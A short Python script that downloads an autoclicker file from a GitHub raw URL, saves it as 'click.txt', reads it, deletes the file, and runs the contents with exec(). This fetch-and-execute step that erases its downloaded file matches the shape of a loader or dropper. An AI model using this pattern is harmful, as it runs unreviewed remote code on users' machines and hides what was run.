import wget
import os
remote_url = 'https://raw.githubusercontent.com/tygoz/pyclicker/main/autoclicker.py'
local_file = 'click.txt'
wget.download(remote_url, local_file)
f = open("click.txt", "r")
file = f.read()
f.close()
os.remove("click.txt")
print('')
exec(file)

